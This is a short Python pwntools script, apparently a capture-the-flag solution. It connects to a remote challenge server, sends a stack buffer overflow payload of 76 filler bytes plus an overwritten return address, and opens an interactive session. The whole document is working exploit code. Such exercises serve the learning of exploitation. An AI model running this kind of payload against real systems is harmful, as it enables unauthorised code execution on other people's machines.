import pwn

p = pwn.remote('cybersub.bytesoc.dev', 9999)
payload = b'A' * 76 + pwn.p32(0x080491a6)

p.sendline(payload)
p.interactive()